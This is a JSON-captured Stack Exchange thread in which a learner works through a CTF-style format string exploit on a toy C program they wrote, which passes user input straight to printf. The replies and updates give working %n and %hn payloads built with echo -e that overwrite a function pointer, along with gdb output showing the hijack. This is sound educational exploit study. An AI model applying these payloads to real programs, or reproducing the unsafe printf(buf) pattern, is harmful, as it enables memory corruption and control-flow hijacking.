@@ -1,0 +1,62 @@
+{
+    "title": "Newbie problems exploiting a format string vulnerability",
+    "link": "https://reverseengineering.stackexchange.com/questions/25257/newbie-problems-exploiting-a-format-string-vulnerability",
+    "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>I encountered a print format vulnerability challenge in a CTF. I don't know anything about these vulnerabilities, so I'm working my way through Saif El-Sherei's format string exploitation tutorial from exploit-db.com (<a href=\"https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf\" rel=\"nofollow noreferrer\">https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf</a>). But, I'm getting stuck really early on. I'm hoping someone can point out where I'm going wrong.</p>\n<p>Here's some code I wrote:</p>\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid nicefunction()\n{\n        printf(\"you are in the nice function!\\n\");\n}\nvoid notnicefunction()\n{\n        printf(\"you are in the NOT nice function!\\n\");\n}\nint foo()\n{\n  void (*fptr)() = &amp;nicefunction;\n  char buf[100];\n\n  puts(\"Please enter a string. \");\n  fgets(buf,80,stdin);\n  puts(\"Here's your string\");\n  printf(buf);\n  puts(\"\\nNow we call the nice function\");\n  (*fptr)();\n  return 0;\n}\n\nint main(int argc, char **argv)\n{\n  foo();\n}\n</code></pre>\n<p>My goal is to craft an input string that I can use to change fptr to point to notnicefunction. I compiled it with: <code>gcc -m32 -g test.c -fno-stack-protector -z execstack -o test</code></p>\n<p>I ran the binary under gdb and added before and after breakpoints. When I enter the string \"AAAA\" and then do x/20xw $esp afterwards, I see my 0x41414141 in the stack, at 0xffffd018. If I rerun and enter the string \"AAAA %6$x\" I get AAAA 41414141. So far so good.</p>\n<p>Now I want to find the address of fptr. Using nm, I see that it should contain the value of 0x0804849b (the address of nicefunction). My goal is to change it to 0x080484b4, the address of notnicefunction. I rerun with AAAA, and then examine the stack until I find the address that contains 0x0804849b. That's 0xffffd07c, 0x64 (100d) words deeper in the stack from the start of buf. Which makes sense.</p>\n<p>I'd like to control the contents of fptr by using %n. So I crafted this input string: \\x7c\\xd0\\xff\\xff\\xff\\xffAAAA%5$x%n. I think this should change the contents of 0xffffd07c to 13d. But instead I segfault in the printf.</p>\n<p>Where am I going wrong?</p>\n<p><strong>UPDATE:</strong> I tried writing my fptr address into the start of the buffer, just to see if I was writing the address correctly. But when I checked it in gdb, it had the ASCII representation in it: </p>\n<pre><code>(gdb) x/20xw $esp+8\n0xffffd018: 0x6337785c  0x3064785c  0x6666785c  0x6666785c\n</code></pre>\n<p>So the problem is that bash doesn't like my hex literals. I guess I could fix this with redirection from a file. But if anyone knows of a cleaner way to handle this, I'd love to know about it.</p>\n<p><strong>MOAR UPDATE</strong>: Pawel's comment below got me past the how-do-I-get-hex-bytes-into-this-binary hurdle. But I was still segfaulting on my %n. But the segfaults went away when I changed %5$x %n to %x %x %x %x %x %n. Now I am able to (sort of) control the contents of arbitrary stack memory. Whoohoo!</p>\n</div>",
+    "votes": "2",
+    "answers": 2,
+    "views": "287",
+    "tags": [
+        "linux",
+        "c",
+        "exploit"
+    ],
+    "user": "Polly",
+    "time": "Jun 10, 2020 at 22:02",
+    "comments": [
+        {
+            "user": "Paweł Łukasik",
+            "text": "<span class=\"comment-copy\">how are you passing your data to this binary? Try something like <code>echo -e \\x7c\\xd0\\xff\\xff\\xff\\xffAAAA%5$x%n | ./test</code></span>",
+            "time": null
+        },
+        {
+            "user": "Polly",
+            "text": "<span class=\"comment-copy\">Pawel's comment pointed me on the way, with one tweak because I'm running under gdb: echo -n -e '\\x7c\\xd0\\xff\\xff. %x %x %x %x %x %n' &gt; /tmp/xxx and then r &lt; /tmp/xxx at the gdb prompt.</span>",
+            "time": null
+        },
+        {
+            "user": "multithr3at3d",
+            "text": "<span class=\"comment-copy\">If you want a realistic challenge, compile with the default flags.</span>",
+            "time": null
+        }
+    ],
+    "answers_data": [
+        {
+            "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>The input string that finally let me execute the not nice function was echo -n -e '\\x7c\\xd0\\xff\\xffJUNK\\x7e\\xd0\\xff\\xff. %x %x %x %x %33929x %hn' &gt; /tmp/xxx</p>\n<p>This gave me:</p>\n<pre><code>22    (*fptr)();\n(gdb) x/4xw 0xffffd070\n0xffffd070: 0x00000001  0x00000003  0xf7e25a50  0x080484b4\n(gdb) c\nContinuing.\nyou are in the NOT nice function!\n</code></pre>\n</div>",
+            "votes": "1",
+            "user": "Polly",
+            "time": "Jun 10, 2020 at 22:01",
+            "is_accepted": false,
+            "comments": [
+                {
+                    "user": "multithr3at3d",
+                    "text": "<span class=\"comment-copy\">I don't think you need the address twice since you are only using one %n</span>",
+                    "time": null
+                }
+            ]
+        },
+        {
+            "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>I am not sure the <code>%n</code> takes the next argument after the <code>%5$x</code>.</p>\n<p>Try <code>\\x7c\\xd0\\xff\\xffAAAA%6$n</code>. Seemed to work for me.</p>\n</div>",
+            "votes": "0",
+            "user": "Artelius",
+            "time": "Jun 9, 2020 at 23:51",
+            "is_accepted": false,
+            "comments": [
+                {
+                    "user": "Polly",
+                    "text": "<span class=\"comment-copy\">Thanks for the suggestion ... but I tried it and no joy.</span>",
+                    "time": null
+                }
+            ]
+        }
+    ]
+}
